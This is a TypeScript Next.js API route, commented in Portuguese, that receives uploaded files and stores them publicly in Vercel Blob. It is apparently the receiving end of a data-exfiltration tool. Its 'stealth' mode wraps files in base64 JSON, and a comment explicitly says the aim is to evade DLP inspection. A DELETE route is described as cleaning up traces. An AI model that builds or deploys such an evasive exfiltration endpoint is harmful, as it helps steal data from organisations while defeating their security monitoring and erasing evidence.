import { put, del } from '@vercel/blob';
import { NextResponse } from 'next/server';

export async function POST(request: Request): Promise<NextResponse> {
  // 1. Segurança: Validação de Variáveis de Ambiente
  const SECRET = process.env.AUDIT_SECRET;

  if (!SECRET) {
    console.error('SERVER ERROR: AUDIT_SECRET não configurado.');
    return NextResponse.json({ error: 'Erro de configuração no servidor' }, { status: 500 });
  }

  // 2. Segurança: Validação do Token
  const token = request.headers.get('x-audit-token');
  
  if (token !== SECRET) {
    return NextResponse.json({ error: 'Acesso Negado' }, { status: 401 });
  }

  // 3. Captura de Parâmetros
  const { searchParams } = new URL(request.url);
  const filename = searchParams.get('filename');
  const mode = searchParams.get('mode'); // Captura o modo (stealth ou normal)

  if (!filename) {
    return NextResponse.json({ error: 'Nome do arquivo necessário' }, { status: 400 });
  }

  // 4. Validação de Extensões (Lista Completa)
  const allowedExtensions = [
    // Documentos e Imagens
    '.txt', '.docx', '.doc', '.png', '.jpg', '.jpeg', '.gif', '.log', '.csv', '.xlsx', '.xls', '.pdf', '.json', '.zip', '.rar',
    // Códigos e Scripts
    '.py',   // Python
    '.js',   // JavaScript
    '.jsx',  // React JS
    '.ts',   // TypeScript
    '.tsx',  // React TS
    '.java', // Java
    '.c',    // C
    '.cpp',  // C++
    '.cs',   // C#
    '.go',   // Go
    '.rb',   // Ruby
    '.php',  // PHP
    '.sh',   // Shell Script
    '.bat',  // Batch
    '.sql',  // SQL
    '.html', '.css', '.xml', '.yaml', '.yml', '.md' // Web & Config
  ];

  const isAllowed = allowedExtensions.some(ext => filename.toLowerCase().endsWith(ext));
  
  if (!isAllowed) {
    return NextResponse.json({ 
      error: `Extensão bloqueada. Permitidos: ${allowedExtensions.join(', ')}` 
    }, { status: 403 });
  }

  // 5. Processamento do Corpo do Arquivo (Normal vs Stealth)
  let fileBody;

  if (mode === 'stealth') {
    try {
      // MODO STEALTH: O arquivo vem dentro de um JSON como string Base64
      // Isso engana DLPs que buscam assinaturas de arquivo no corpo cru da requisição
      const jsonBody = await request.json();
      
      if (!jsonBody.fileData) {
        throw new Error('Dados do arquivo ausentes no JSON');
      }

      // Remove o cabeçalho do Base64 se existir (ex: "data:image/png;base64,")
      // Pega tudo que vem depois da vírgula
      const base64Data = jsonBody.fileData.includes(',') 
        ? jsonBody.fileData.split(',').pop() 
        : jsonBody.fileData;

      // Converte a string Base64 de volta para Buffer binário
      fileBody = Buffer.from(base64Data, 'base64');
      
    } catch (e) {
      console.error('Erro no modo Stealth:', e);
      return NextResponse.json({ error: 'Falha ao processar payload Stealth' }, { status: 400 });
    }
  } else {
    // MODO NORMAL: O corpo da requisição é o próprio stream do arquivo
    if (!request.body) {
      return NextResponse.json({ error: 'Arquivo inválido ou corpo vazio' }, { status: 400 });
    }
    fileBody = request.body;
  }

  // 6. Upload para Vercel Blob
  try {
    const blob = await put(filename, fileBody, { access: 'public' });
    return NextResponse.json(blob);
  } catch (error) {
    console.error('Erro no Vercel Blob:', error);
    return NextResponse.json({ error: 'Erro interno no upload' }, { status: 500 });
  }
}

// Rota DELETE para limpeza de rastros
export async function DELETE(request: Request): Promise<NextResponse> {
  const SECRET = process.env.AUDIT_SECRET;
  const token = request.headers.get('x-audit-token');

  // Validação estrita
  if (!SECRET || token !== SECRET) {
    return NextResponse.json({ error: 'Acesso Negado' }, { status: 401 });
  }

  const { searchParams } = new URL(request.url);
  const urlToDelete = searchParams.get('url');

  if (!urlToDelete) {
    return NextResponse.json({ error: 'URL necessária para deleção' }, { status: 400 });
  }

  try {
    await del(urlToDelete);
    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ error: 'Falha ao deletar arquivo' }, { status: 500 });
  }
}